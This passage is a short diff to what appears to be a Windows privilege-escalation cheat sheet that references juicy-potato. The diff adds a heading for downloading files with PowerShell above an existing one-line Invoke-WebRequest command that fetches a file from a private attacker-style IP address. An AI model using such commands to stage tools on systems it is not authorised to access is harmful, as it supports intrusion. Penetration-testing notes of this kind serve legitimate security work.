@@ -322,4 +322,7 @@ Use: https://github.com/ohpe/juicy-potato
 
 
 
+## Download files
+### With Powershell
+
 powershell -command "& { iwr http://192.168.199.1/win.txt -OutFile win.txt }"
